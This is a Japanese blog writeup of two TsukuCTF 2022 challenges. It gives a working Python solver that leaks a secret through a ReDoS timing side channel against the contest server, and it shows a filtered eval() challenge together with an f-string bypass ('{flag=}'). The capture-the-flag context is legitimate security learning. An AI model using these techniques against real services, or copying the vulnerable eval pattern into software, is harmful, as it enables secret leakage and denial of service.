---
title: TsukuCTF 2022 writeup
url: https://furutsuki.hatenablog.com/entry/2022/10/23/183520
source: ふるつき
date: 2022-10-24
fetch_date: 2025-10-03T20:43:14.387614
---

# TsukuCTF 2022 writeup

[![ふるつき](https://cdn.image.st-hatena.com/image/square/22d94d91fe8214e59637e6fa6173edbe2edc56c6/backend=imagemagick;height=128;version=1;width=128/https%3A%2F%2Fcdn.user.blog.st-hatena.com%2Fblog_custom_icon%2F96439929%2F1745809789466802)](https://furutsuki.hatenablog.com/)

[ふるつき](https://furutsuki.hatenablog.com/)

[読者になる](https://blog.hatena.ne.jp/Furutsuki/furutsuki.hatenablog.com/subscribe?utm_source=blogs_topright_button&utm_medium=button&utm_campaign=subscribe_blog)

# [ふるつき](https://furutsuki.hatenablog.com/)

## v(\*'='\*)v 記事がよかったらスターつけていってください

[2022-10-23](https://furutsuki.hatenablog.com/archive/2022/10/23)

# [TsukuCTF 2022 writeup](https://furutsuki.hatenablog.com/entry/2022/10/23/183520)

"This is a CTF with Japanese OSINT as the main genre." という激ユニークなCTFがあって、98ptsというチームで出ました[\*1](#f-e70710dd "zer0ptsにst98さん要素で98ptsにしたけど、pがなければst98のアナグラムになってたんだなぁということにいまさら気がついた。もうひと捻りできましたね")。メインディッシュであるところのOSINTは全くわからなかったのでチームメイトにすべて丸投げしていて、前菜のmiscを2問だけ解いたのでそれのwriteupです。OSINTはについてはst98さんのwriteupを参照されてください

[nanimokangaeteinai.hateblo.jp](https://nanimokangaeteinai.hateblo.jp/entry/2022/10/23/180703)

* [soder](#soder)
* [lucky number 777](#lucky-number-777)

## soder

問題の[スクリプト](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D7%A5%EF%BF%BD)が簡潔なので好き。[正規表現](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%C9%BD%EF%BF%BD%EF%BF%BD)のパターンを入力すると、`re.match(pattern, FLAG)` してくれるが、結果は教えてもらえない。何をやればよいかと言うとReDoS[\*2](#f-88b038b0 "問題名にもそう書いてある。個人的に問題名に解法を埋め込むやつきらいです")という、めちゃめちゃバックトラックが多いパターンを入力すると[正規表現](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%C9%BD%EF%BF%BD%EF%BF%BD)の処理に時間がかかることをオ[ラク](http://d.hatena.ne.jp/keyword/%EF%BF%BD%E9%A5%AF)ルにしてフラグの情報を抜き出す技があるのでそれ。

詳しいことは何もしらないけど、そういえばTakashi Yoneuchi氏が詳しかったなと言うことを思い出して <https://shift-js.info/> を見に行ったら案の定ReDoSについて解説しているスライドがあったし、なんなら今回のケースにドンピシャなオ[ラク](http://d.hatena.ne.jp/keyword/%EF%BF%BD%E9%A5%AF)ルの作り方も懇切丁寧に書いてあった[\*3](#f-8e241058 "この情報にたどり着けるかどうかなので実質OSINTという説がありますか？")。

[speakerdeck.com](https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques?slide=24)

Takashi Yoneuchi氏に深い感謝を捧げながら[スクリプト](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D7%A5%EF%BF%BD)を書いて回して待つ。なんかptrlibのtimeoutがうまく動かなくて例外がちゃんと送出されなかった。なぜ

```
from ptrlib import Socket
from logging import getLogger
import string
import re
import time
from timeout_decorator import timeout, TimeoutError
from tqdm import tqdm

getLogger("ptrlib").setLevel(0)

def redos_if(pattern):
    return "^(?={})((.*)*)*hoge$".format(pattern)

@timeout(1)
def timeout_pattern(pattern):
    sock = Socket("nc 133.130.103.51 31417")
    sock.sendlineafter("Pattern: ", redos_if(pattern))
    sock.recvline()
    sock.recvline(timeout=1)

def oracle(pattern):
    t1 = time.time()
    try:
        timeout_pattern(pattern)
    except TimeoutError:
        return 5
    t2 = time.time()

    return t2 - t1

def is_nth_char(n, c):
    return ".{"+str(n)+"}"+re.escape(c)+".*"

known_flags = []
while True:
    for c in tqdm(string.printable):
        if oracle(is_nth_char(len(known_flags), c)) > 1:
            known_flags.append(c)
            break
        time.sleep(0.1)
    print(known_flags)
```

## lucky number 777

問題の[スクリプト](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D7%A5%EF%BF%BD)が簡潔なので好き2[\*4](#f-df57aa8d "でもラッキーナンバーのコンセプトがどのあたりにあるのかはあんまりわかってない")。送った文字列を`eval` してくれるが、便利そうな記号は大体封じられている。`"{flag}" in lukcy_number` が封じられているように`{}`や`""`は入力可能なのでこれをうまく使いたい。

```
import string

def challenge(lucky_number: str):
    flag = "TsukuCTF22{THIS_IS_NOT_FLAG}"  # TOP SECRET
    printable = string.printable
    filter = "_[].,*+%: 　|()#\\\t\r\v\f\n"  # (￣ー￣)

    if not all(c in printable for c in lucky_number):
        return "No Hack!!!"

    if any(c in filter for c in lucky_number):
        return "No Hack!!!"

    if lucky_number == "flag" or "{flag}" in lucky_number:
        return "No Hack!!!"

    try:
        return "your lucky_number is " + str(eval(lucky_number))
    except:
        return "No Hack!!!"
```

[python](http://d.hatena.ne.jp/keyword/python)のf-stringについてなんかないかな〜と思ってドキュメントを眺めていたら`f"{flag}"`はフィルタに引っかかるので禁止されているが、`f"{flag=}"`はフィルタをすり抜けることに気がついたので、それを入れて勝ち

---

最近腑抜けているので、「こういうのでいいんだよな〜」と思いながら解いていた。楽しいね

[\*1](#fn-e70710dd):zer0ptsにst98さん要素で98ptsにしたけど、pがなければst98の[アナグラム](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%CA%A5%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD)になってたんだなぁということにいまさら気がついた。もうひと捻りできましたね

[\*2](#fn-88b038b0):問題名にもそう書いてある。個人的に問題名に解法を埋め込むやつきらいです

[\*3](#fn-8e241058):この情報にたどり着けるかどうかなので実質OSINTという説がありますか？

[\*4](#fn-df57aa8d):でもラッキーナンバーのコンセプトがどのあたりにあるのかはあんまりわかってない

Furutsuki
[2022-10-23 18:35](https://furutsuki.hatenablog.com/entry/2022/10/23/183520)

[読者になる](https://blog.hatena.ne.jp/Furutsuki/furutsuki.hatenablog.com/subscribe?utm_source=blogs_entry_footer&utm_medium=button&utm_campaign=subscribe_blog)

[![この記事をはてなブックマークに追加](https://b.st-hatena.com/images/entry-button/button-only.gif)](https://b.hatena.ne.jp/entry/s/furutsuki.hatenablog.com/entry/2022/10/23/183520 "この記事をはてなブックマークに追加")

関連記事

* [![CPCTF 2024 writeup](https://cdn.image.st-hatena.com/image/square/298058b2bffe422918ac5e915861b0c0839ae26b/backend=imagemagick;height=100;version=1;width=100/https%3A%2F%2Fcdn.blog.st-hatena.com%2Fimages%2Ftheme%2Fog-image-1500.png "CPCTF 2024 writeup")](https://furutsuki.hatenablog.com/entry/2024/04/21/180019)

  [2024-04-21](https://furutsuki.hatenablog.com/archive/2024/04/21)

  [CPCTF 2024 writeup](https://furutsuki.hatenablog.com/entry/2024/04/21/180019)

  久しぶりにCTFに参加しました。cryptoのある程度以上の難易度の…
* [![ACTF 2022 writeup](https://cdn.image.st-hatena.com/image/square/298058b2bffe422918ac5e915861b0c0839ae26b/backend=imagemagick;height=100;version=1;width=100/https%3A%2F%2Fcdn.blog.st-hatena.com%2Fimages%2Ftheme%2Fog-image-1500.png "ACTF 2022 writeup")](https://furutsuki.hatenablog.com/entry/2022/06/28/001931)

  [2022-06-28](https://furutsuki.hatenablog.com/archive/2022/06/28)

  [ACTF 2022 writeup](https://furutsuki.hatenablog.com/entry/2022/06/28/001931)

  zer0pts で ACTF に出たのでwriteupです。真面目に取り組んで8…
* [![Securinets CTF 2021 Quals writeup](https://cdn.image.st-hatena.com/image/square/298058b2bffe422918ac5e915861b0c0839ae26b/backend=imagemagick;height=100;version=1;width=100/https%3A%2F%2Fcdn.blog.st-hatena.com%2Fimages%2Ftheme%2Fog-image-1500.png "Securinets CTF 2021 Quals writeup")](https://furutsuki.hatenablog.com/entry/2021/03/22/102747)

  [2021-03-22](https://furutsuki.hatenablog.com/archive/2021/03/22)

  [Securinets CTF 2021 Quals writeup](https://furutsuki.hatenablog.com/entry/2021/03/22/102747)

  楽しく解ける問題ばかりで評価が高い。BOSS問という感じの問題…
* [![BambooFox CTF 2019 Oracle writeup](https://cdn.image.st-hatena.com/image/square/298058b2bffe422918ac5e915861b0c0839ae26b/backend=imagemagick;height=100;version=1;width=100/https%3A%2F%2Fcdn.blog.st-hatena.com%2Fimages%2Ftheme%2Fog-image-1500.png "BambooFox CTF 2019 Oracle writeup")](https://furutsuki.hatenablog.com/entry/2020/01/01/221936)

  [2020-01-01](https://furutsuki.hatenablog.com/archive/2020/01/01)

  [BambooFox CTF 2019 Oracle writeup](https://furutsuki.hatenablog.com/entry/2020/01/01/221936)

  We're given the server.py and the nc information. #!/usr/bi…
* [![CTFZone 2019 Quals Writeup](https://cdn.image.st-hatena.com/image/square/298058b2bffe422918ac5e915861b0c0839ae26b/backend=imagemagick;height=100;version=1;width=100/https%3A%2F%2Fcdn.blog.st-hatena.com%2Fimages%2Ftheme%2Fog-image-1500.png "CTFZone 2019 Quals Writeup")](https://furutsuki.hatenablog.com/entry/2019/12/02/145526)

  [2019-12-02](https://furutsuki.hatenablog.com/archive/2019/12/02)

  [CTFZone 2019 Quals Writeup](https://furutsuki.hatenablog.com/entry/2019/12/02/145526)

  [Crypto] Agents AES-OFB encrypted json which may formed : {…

* もっと読む

コメントを書く

[«
zer0ptsのdiscordで便利なbot 2選](https://furutsuki.hatenablog.com/entry/2022/11/02/15165...